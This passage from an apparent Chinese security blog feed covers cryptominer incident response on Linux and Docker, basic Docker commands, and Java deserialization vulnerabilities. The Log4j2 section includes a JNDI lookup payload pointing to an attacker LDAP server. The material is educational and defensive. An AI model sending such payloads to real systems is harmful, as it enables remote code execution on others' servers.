class="code"><pre><code class="hljs awk">ll <span class="hljs-regexp">/proc/</span>xxxx<br></code></pre></td></tr></table></figure><ol start="4"><li>进入进程目录，查看配置信息</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> [目录路径]<br><span class="hljs-built_in">cat</span> config.json<br></code></pre></td></tr></table></figure><p>如果是挖矿木马基本上可以在配置文件中发现一个网站，其中包含一个挖矿的地址。可以通过微步情报等平台进行查询。</p><ol start="5"><li>查看主机的连接情况</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -antp</span><br></code></pre></td></tr></table></figure><p>可以看到本地主机连接端口和外部ip以及连接状态。定位恶意ip进程。</p><ol start="6"><li>杀死未授权进程</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> xxxx<br></code></pre></td></tr></table></figure><ol start="7"><li>删除对应文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf 文件名<br></code></pre></td></tr></table></figure><p><strong>及时隔离主机，阻断可以通信。防止受害主机对局域网下的其他主机先进性横向渗透</strong>。</p><ol start="8"><li>清除计划任务。大部分病毒或后门文件都会写入到计划任务中实现持久运行</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crontab</span> -l <span class="hljs-comment">#查看计划任务</span><br></code></pre></td></tr></table></figure><ol start="9"><li>清除启动项。除了计划任务，挖矿木马通过添加启动项同样能实现持久化</li></ol><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-unit-files</span> <span class="hljs-comment">#查看自启动列表</span><br><span class="hljs-string">cat</span> /<span class="hljs-string">etc</span>/<span class="hljs-string">init</span>.<span class="hljs-string">d</span>/ <span class="hljs-comment">#查看开机自启动项目录</span><br></code></pre></td></tr></table></figure><p>​过滤出所有的开机启动的项目</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-unit-files</span> |<span class="hljs-string">grep</span> <span class="hljs-string">enabled</span><br></code></pre></td></tr></table></figure><p>​关闭服务</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">disable</span> 服务名<br></code></pre></td></tr></table></figure><ol start="10"><li>异常用户分析与排查</li><li>登录分析 - 筛选异常登录</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cat</span> /etc/passwd<br><span class="hljs-literal">last</span> -i | grep -v <span class="hljs-number">0.0.0.0</span> <span class="hljs-comment">#筛选非本地登录</span><br></code></pre></td></tr></table></figure><ol start="11"><li>历史执行命令排查</li><li>异常$PATH排查</li><li>Linux后门自动排查</li><li>排查/tmp文件</li></ol><p><strong>安全加固：</strong></p><p>1、根据相关日志寻找挖矿病毒是如何进入主机的，将漏洞进行修补。</p><blockquote><p>linux系统日志在/var/log目录下</p><p>尽量使用less这种不需要读取全部文件的指令，因为在线上执行cat是一件非常危险的事情，这可能导致线上服务器资源不足。</p><p>Apache的访问日志目录在其配置文件中已经定义好了，CentOS中apache的配置文件位置为<code>/etc/httpd/conf/httpd.conf</code>,默认的访问日志存放在<code>/var/log/httpd/access_log</code>中</p></blockquote><p>2、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护；</p><p>3、及时更新 Linux安全补丁，开启防火墙临时关闭端口；</p><p>4、及时更新web漏洞补丁，升级web组件。</p><h1>Docker</h1><p>当网络流量监控发现某台运行多个docker容器的主机主动连接到一个疑似挖矿矿池的地址时，需要快速响应和排查，以阻止进一步的损害。</p><ol><li>定位容器</li></ol><p>在宿主机上通过netstat -an 是看不到容器内的网络连接的，而一台台进入容器查看网络连接，排查效率很慢。宿主机上的容器都是通过dokcer0进行通信的，因此，可以通过<code>tcpdump</code>找到异常网络连接的容器IP地址，然后进一步关联到容器。</p><p><strong>tcpdump抓包定位容器ip地址</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tcpdump -<span class="hljs-selector-tag">i</span> docker0 dst host xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> -v<br></code></pre></td></tr></table></figure><p><strong>获取所有容器名称及其ip地址，定位到容器</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml"> - </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.IPAddress</span> &#125;&#125;</span><span class="language-xml">&#x27; $(docker ps -aq) |grep xx.xx.xx.xx</span><br></code></pre></td></tr></table></figure><blockquote><p>这里xx.xx.xx.xx是与恶意ip建立网络连接的容器</p></blockquote><p><strong>进入容器network namespace进行确认，找到异常的网络连接地址。</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#获取容器PID</span><br>docker inspect -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; &lt;containerId&gt;<br><span class="hljs-meta">#进入容器的network namespace</span><br>nsenter  -n -t pid <br><span class="hljs-meta"># 验证是否进入容器的network namespace</span><br>netstat -an<span class="hljs-string">|grep xx.xx.xx.xx</span><br></code></pre></td></tr></table></figure><p><strong>进入容器，找到挖矿程序的进程，<a href="http://xn--xmrig-dq1hv64hkubmxbf19ahj1elg6a.sh">恶意脚本路径为xmrig.sh</a></strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">ps <span class="hljs-built_in">aux</span><br></code></pre></td></tr></table></figure><p>我们需要进一步确认的是挖矿程序时在容器运行过程中被植入了，还是镜像文件中已经存在挖矿程序。</p><p><strong>使用docker diff命令查看容器内文件状态变化，<a href="http://xn--xmrig-6o6h178gm2h.sh">未找到xmrig.sh</a>。</strong></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">docker</span> diff serene_lam<span class="hljs-keyword">port</span> | grep .sh<br></code></pre></td></tr></table></figure><p><strong>通过docker inspect 快速定位镜像文件系统在宿主机上对应的目录，从镜像中提取恶意文件进行对比，以确认入侵的源头为恶意镜像。</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">docker <span class="hljs-keyword">inspect</span> --<span class="hljs-keyword">format</span>=&#123;&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><p><strong>镜像分析</strong></p><p>追溯镜像的来源，解析Dockerfile文件是关键步骤。</p><p>使用docker history 命令查看指定镜像的创建历史，加上 --no-trunc，就可以看到全部信息。</p><p>使用dfimage从镜像中提取 Dockerfile，在这里可以清晰地看到恶意镜像构建的过程，找到恶意挖矿程序的样本</p><p><strong>问题处理</strong></p><p>（1）查找恶意镜像关联的容器</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker <span class="hljs-keyword">ps</span> -<span class="hljs-keyword">a</span>|<span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;IMAGE_NAME&gt;</span><br></code></pre></td></tr></table></figure><p>删除相关容器或镜像</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">docker rm -f  <span class="hljs-tag">&lt;<span class="hljs-name">containerId</span>&gt;</span><br>docker rmi <span class="hljs-tag">&lt;<span class="hljs-name">IMAGE_NAME</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>应急响应</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker命令及使用</title>
    <link href="/posts/c983d692.html"/>
    <url>/posts/c983d692.html</url>
    
    <content type="html"><![CDATA[<p>docker命令手册：<a href="https://docs.docker.com/engine/reference/commandline/logs/">https://docs.docker.com/engine/reference/commandline/logs/</a></p><h2 id="嘛玩意是docker啊？"><a class="header-anchor" href="#嘛玩意是docker啊？">¶</a>嘛玩意是docker啊？</h2><pre><code class="hljs">Docker是一个开源的应用容器引擎，它基于Google 公司推出的Go 语言实现，项目代码托管在 GitHub 上进行维护;https:github.com/docker/docker-ce；Docker 技术让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，打包好的容器可以发布到任何流行的 Linux 服务器上运行，这样就可以解决开发环境与运维环境不一致的问题了，所以容器技术解决了开发和运维之间的矛盾，让开发专注于开发，运维专注于运维，不要被环境问题所打扰；Docker彻底释放了虚拟化的威力，极大降低了计算机资源供应的成本，Docker重新定义了程序开发测试、交付和部署过程，Docker提出了“构建一次，到处运行”的理念，让应用的开发、测试、部署和分发都变得前所未有的高效和轻松！Docker是一种轻量级的操作系统虚拟化解决方案，Docker的基础是 Linux 容器（LXC）技术，在 LXC的基础上 Docker进行了进一步的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户操作 Docker的容器就像操作一个快速轻量级的虚拟机一样简单;Docker 自开源后受到广泛的关注，Docker最早是基于Ubuntu开发的，但后续CentOS、Debian、Fedora等主流的Linux操作系统都支持Docker；</code></pre><p>总结∶</p><p>简单地说，Docker是对软件和其依赖环境的标准化打包，应用之间相互隔离，共享一个OS Kernel（解决了资源浪费的问题），可以运行在很多主流操作系统上；但是也需要澄清一下，Docker 本身不是容器，Docker 只是管理容器的引擎。</p><h2 id="docker-基础命令"><a class="header-anchor" href="#docker-基础命令">¶</a>docker 基础命令</h2><p><strong>linux 下启动docker：</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl start docker    <span class="hljs-comment">#启动docker服务</span><br><span class="hljs-params">system</span>ctl stop docker     <span class="hljs-comment">#停止docker服务</span><br><span class="hljs-params">system</span>ctl restart docker  <span class="hljs-comment">#重启docker服务</span><br><span class="hljs-params">system</span>ctl status docker   <span class="hljs-comment">#查看docker服务状态</span><br><span class="hljs-params">system</span>ctl enable docker   <span class="hljs-comment">#设置开机启动服务</span><br><br>docker version <span class="hljs-comment">#查看docker 版本号信息</span><br>docker info<br><br></code></pre></td></tr></table></figure><h2 id="docker-镜像命令"><a class="header-anchor" href="#docker-镜像命令">¶</a>docker 镜像命令</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker images<span class="hljs-comment">#查看自己服务器中docker 镜像列表</span><br>docker search <span class="hljs-comment">#镜像名</span><br>docker search <span class="hljs-comment">--filter=STARS=9000 mysql 搜索 STARS &gt;9000的</span><br></code></pre></td></tr></table></figure><p>不加tag(版本号) 即拉取docker仓库中 该镜像的最新版本latest 加:tag 则是拉取指定版本</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker pull 镜像名 <br>docker pull 镜像名:<span class="hljs-keyword">tag</span><br></code></pre></td></tr></table></figure><p>运行镜像</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> 镜像名<br>docker <span class="hljs-built_in">run</span> 镜像名:Tag<br>docker <span class="hljs-built_in">run</span> --name=&#123;your_name&#125; --d &#123;image_name&#125;  #运行容器<br></code></pre></td></tr></table></figure><p>删除镜像</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#删除一个</span><br>docker rmi <span class="hljs-operator">-f</span> 镜像名/镜像ID<br><br><span class="hljs-comment">#删除多个 其镜像ID或镜像用用空格隔开即可 </span><br>docker rmi <span class="hljs-operator">-f</span> 镜像名/镜像ID 镜像名/镜像ID 镜像名/镜像ID<br><br><span class="hljs-comment">#删除全部镜像  -a 意思为显示全部, -q 意思为只显示ID</span><br>docker rmi <span class="hljs-operator">-f</span> <span class="hljs-variable">$</span>(docker images <span class="hljs-literal">-aq</span>)<br></code></pre></td></tr></table></figure><p>强制删除镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker image <span class="hljs-built_in">rm</span> 镜像名称/镜像ID<br></code></pre></td></tr></table></figure><p>保存镜像</p><blockquote><p>将我们的镜像 保存为tar 压缩文件 这样方便镜像转移和保存 ,然后 可以在任何一台安装了docker的服务器上 加载这个镜像</p></blockquote><p>命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker save 镜像名/镜像ID -o 镜像保存在哪个位置与名字<br></code></pre></td></tr></table></figure><p>加载镜像</p><blockquote><p>任何装 docker 的地方加载镜像保存文件,使其恢复为一个镜像</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker load -<span class="hljs-selector-tag">i</span> 镜像保存文件位置<br></code></pre></td></tr></table></figure><p>查看正在运行容器列表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">docker <span class="hljs-built_in">ps</span> <br><br>docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span><span class="hljs-comment">#查看所有容器 -----包含正在运行 和已停止的</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化全家桶</title>
    <link href="/posts/a840fd.html"/>
    <url>/posts/a840fd.html</url>
    
    <content type="html"><![CDATA[<h2 id="java序列化与反序列化"><a class="header-anchor" href="#java序列化与反序列化">¶</a>java序列化与反序列化</h2><p>1、概述</p><p>两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上传输。</p><p>java是面向对象的开发方式，一切都是java对象，想要在网络中传输java对象，可以使用序列化和反序列化去实现，发送发需要将java对象转换为字节序列，然后在网络上传送，接收方收到字符序列后，会通过反序列化将字节序列恢复成java对象。</p><p>序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</p><p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，<strong>ObjectOutputStream类的writeObject()方法可以实现序列化</strong>。反序列化是指把字节序列恢复为 Java 对象的过程，<strong>ObjectInputStream 类的 readObject() 方法用于反序列化。</strong></p><blockquote><p>1.JDK类库提供的序列化API:</p><p>java.io.ObjectOutputStream<br>表示对象输出流，其中writeObject(Object obj)方法可以将给定参数的obj对象进行序列化，将转换的一连串的字节序列写到指定的目标输出流中。<br>java.io.ObjectInputStream<br>该类表示对象输入流，该类下的readObject(Object obj)方法会从源输入流中读取字节序列，并将它反序列化为一个java对象并返回。</p></blockquote><p>2、什么是序列化和反序列化</p><p>Java序列化就是指把Java对象转换为字节序列的过程</p><p>Java反序列化就是指把字节序列恢复为Java对象的过程。</p><p>在序列化和反序列化中很重要的两个方法<strong>writeObject和readObject</strong>，这两个方法可以经过开发者的重写，一般开发者们会根据自己的需求来进行重写，然而只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p><p><strong>在反序列化的时候<code>readObject</code>中代码会自动执行，如果<code>readObject</code>插入命令执行的代码，也就执行，就产生了安全漏洞。</strong></p><pre><code class="hljs">所以从根本上来说，Java 反序列化的漏洞的与readObject有关。</code></pre><h2 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h2><p>共同条件继承Serializable<br>入口类source(重写readObject参数类型宽泛最好jdk自带)调用链gadget chain<br>执行类sink(rce ssf 写文件等等)</p><h1>shiro</h1><blockquote><p>Shiro是一个强大的简单易用的Java安全框架，主要用来更便捷的认证，授权，加密，会话管理。Shiro首要的和最重要的目标就是容易使用并且容易理解。</p></blockquote><h3 id="shiro的身份认证工作流程"><a class="header-anchor" href="#shiro的身份认证工作流程">¶</a>shiro的身份认证工作流程</h3><pre><code class="hljs">通过前端传入的值，获取rememberMe cookiebase64解密AES解密 （对称加解密）反序列化</code></pre><h3 id="shiro反序列化漏洞原理"><a class="header-anchor" href="#shiro反序列化漏洞原理">¶</a>shiro反序列化漏洞原理</h3><p>​AES加密的密钥Key被<strong>硬编码</strong>在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，<strong>攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后</strong>，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p><p><strong>Shiro-550 反序列化漏洞</strong>  CVE-2016-4437</p><p>漏洞原理</p><p>Apache Shiro框架提供了记住密码的功能(RememberMe)，用户登录成功后会生成经过加密并编码的Cookie，在服务端对rememberMe的Cookie值先base64解码然后AES解密在反序列化，就导致了反序列化RCE漏洞</p><p><strong>流程</strong></p><p>得到rememberMe的cookie值 --&gt; Base64解码 --&gt; AES解密 --&gt; 反序列化</p><p><strong>什么是硬编码：</strong><br>硬编码要求程序的源代码在输入数据或所需格式发生变化时进行更改，以便最终用户可以通过程序外的某种方式更改细节。</p><p><strong>Shiro-721 反序列化漏洞</strong>  Shiro Padding Oracle Attack</p><p>漏洞详情</p><p>Apache Shiro 存在高危代码执行漏洞。该漏洞是由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p>漏洞原理</p><p>由于Apache Shiro cookie中通过 AES-128-CBC模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><h3 id="shiro的特征："><a class="header-anchor" href="#shiro的特征：">¶</a>shiro的特征：</h3><pre><code class="hljs">未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段</code></pre><h1>weblogic</h1><p>详细原理参考文章：<a href="https://www.bilibili.com/read/cv17256282/">https://www.bilibili.com/read/cv17256282/</a></p><p><strong>用途</strong>：用于解析java，部署<strong>大型分布式</strong>Web应用的Web中间件</p><h3 id="XMLDecoder反序列化漏洞"><a class="header-anchor" href="#XMLDecoder反序列化漏洞">¶</a>XMLDecoder反序列化漏洞</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML（SOAP协议）数据，在解析的过程中出现反序列化漏洞，导致任意代码执行。出问题的包是wls-wsat、_async。</p><h3 id="T3协议反序列化漏洞"><a class="header-anchor" href="#T3协议反序列化漏洞">¶</a>T3协议反序列化漏洞</h3><p>​开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，利用RMI绕过weblogic的黑名单限制，通过readObject解析加载的内容，获取目标服务器权限。</p><p>T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</p><pre><code class="hljs">T3协议：用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。RMI：远程方法调用，除了该对象本身的虚拟机，其它的虚拟机也可以调用该对象的方法。（对象的虚拟化和反序列化广泛应用到RMI和网络传输中）</code></pre><h1>Fastjson</h1><h3 id="什么是Fastjson"><a class="header-anchor" href="#什么是Fastjson">¶</a><strong>什么是Fastjson?</strong></h3><p>fastjson介绍：fastjson 是一个java语言编写的高性能且功能完善的JSON库，它采用一种“假定有序快速匹配”的算法，把JSON Parse 的性能提升到了极致。FastJson是啊里巴巴的的开源库，用与对JSON格式的数据进行解析和打包。</p><p>fastjson在解析json过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类com.sun.org.apache.xalan.internal.xsltc.trax.Templateslmpl中有一个私有属性 _bytecodes，其部分方法会执行这个值中包含的Java字节码。</p><h3 id="指纹特征"><a class="header-anchor" href="#指纹特征">¶</a>指纹特征</h3><h5 id="有回显"><a class="header-anchor" href="#有回显">¶</a>有回显</h5><p>通过构造错误的POST请求体，服务器返回报错中查看是否存在fastjson字样</p><p><strong>无回显</strong></p><p><strong>方法一：通过DOS延迟方式</strong></p><p>fastjson在版本&lt;1.2.60在取不到值的时候会填充\u001a，发生DOS，我们可以构造请求，通过响应延迟来判断是否使用的fastjson</p><p><strong>方法二：通过DNS回显方式</strong></p><p>通过DNS回显的方式检测后端是否使用的fastjson</p><h5 id="小技巧"><a class="header-anchor" href="#小技巧">¶</a>小技巧</h5><p><strong>如何判断使用的Fastjson还是Jackson?</strong><br>Jackson相对比较严格，强制key和javabean属性对齐，只能少不能多key</p><h3 id="Fastjson反序列化漏洞"><a class="header-anchor" href="#Fastjson反序列化漏洞">¶</a>Fastjson反序列化漏洞</h3><pre><code class="hljs">Fastjson在序列化的时候，会调用成员变量的get方法，私有成员变量不会被序列。Fastjson在反序列化的时候，会调用成员变量的set方法，public修饰的成员全部自动赋值。</code></pre><p>原理：由于它在反序列一个对象的时候会去自动调用这个对象的set方法，所以如果这个set方法中有一些危险的操作，那么就会导致漏洞的产生。</p><blockquote><p>漏洞原理</p><p>fastjson就是为了知道传入的值是水果里的苹果类型还是水果里的苹果手机类型。<strong>加了autotype机制导致的</strong>。因为他为了知道是什么详细类型，每次都需要读取下@type导致的。</p><p>Fastjson反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。</p><p><strong>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</strong></p></blockquote><p>利用思路：上面说了在fastjson反序列化的时候会自动调用对象的set方法，所以我们就有了利用思路，如果我们可以找到一个类，并且这个类中有set方法，这个类的set方法中有一些敏感操作，并且每次运行任意java代码的时候又必须调用这个类，那我们就可以利用这个漏洞了。</p><p>经过大佬的总结，以下这几个类就是我们上面所说的类(这些类都是jdk中的，也就是说不管你运行什么样的代码，它都会调用下面这几个类)：</p><pre><code class="hljs">com.sun.rowsetJdbcRowSetlmplTemplateslmplcom.sun.org.apache.xalan.internal.xsltc.trax</code></pre><blockquote><p>JNDI提供了 查找和访问各种命名和目录服务的通用、统一的接口。支持的服务：DNS，LDAP，RMI，CORBA等</p><p>JNDI注入发生在客户端的lookup()中，如果lookup()的参数可控即可导致被攻击</p></blockquote><h1>Jboss反序列化漏洞</h1><p>CVE-2017-12149</p><p>漏洞影响5.x和6.x版本的JBOSSAS。该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其<strong>doFilter方法</strong>在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。<br>CVE-2017-7504</p><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p><h1>log4j2(CVE-2021-44228)</h1><p>Apache Log4j 2.x &lt;= 2.14.1</p><h3 id="什么是log4j2？"><a class="header-anchor" href="#什么是log4j2？">¶</a>什么是log4j2？</h3><p>log4j2是java中一个流行的的日志框架，可以在服务中记录日志消息，提供了多种方式来记录和处理日志数据，使开发人员可以轻松的生成和管理大量日志信息</p><h3 id="漏洞原理"><a class="header-anchor" href="#漏洞原理">¶</a>漏洞原理</h3><p>由于log4j2库中的<strong>JNDI查询功能存在</strong>反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施。</p><p>导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。</p><h3 id="漏洞的利用流程："><a class="header-anchor" href="#漏洞的利用流程：">¶</a>漏洞的利用流程：</h3><p>1、向目标发送HTTP请求，其中请求包含了由${}字符构成的payload</p><p>2、web服务接受到请求后，会将payload作为参数传入到logh4j2组件中的日志格式化方法</p><p>3、log4j2在格式化日志的时候会解析payload内容，从而根据payload的JNDI协议访问了远程服务器地址</p><p>4、远程服务器收到了log4j2发送的请求，返回恶意的代码</p><p>5、收到了恶意的代码，并执行漏洞攻击原理</p><h3 id="原理概述"><a class="header-anchor" href="#原理概述">¶</a>原理概述</h3><p>​当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中  假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/exp}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/exp 解析到ldap，就会去192.168.61.129:1099的ldap服务找名为shell的资源，如果找不到就会去http服务中找  在http中找到exp之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现exp是一个.class文件，就会去执行里面的代码，从而实现注入 攻击者就可以通过shell实现任意的命令执行，造成严重危害。</p><blockquote><p>JNDI：Java Naming and Directory Interface，即Java命名和目录接口。JNDI包含了一些标准API接口，Java程序可以通过这些接口来访问命名目录服务。它提供了一致的模型来存取和操作企业级的资源如DNS和LDAP。</p></blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/zhuyi666/article/details/129466774">https://blog.csdn.net/zhuyi666/article/details/129466774</a></p><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106538764">https://blog.csdn.net/Aaron_Miller/article/details/106538764</a></p><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106657746">https://blog.csdn.net/Aaron_Miller/article/details/106657746</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/119899231">https://blog.csdn.net/rfrder/article/details/119899231</a></p><p><a href="https://blog.csdn.net/LJH1999ZN/article/details/123880171">https://blog.csdn.net/LJH1999ZN/article/details/123880171</a></p><p><a href="https://blog.csdn.net/qq_63928796/article/details/129157367">https://blog.csdn.net/qq_63928796/article/details/129157367</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>访问域名全流程</title>
    <link href="/posts/a129f2e3.html"/>
    <url>/posts/a129f2e3.html</url>
    
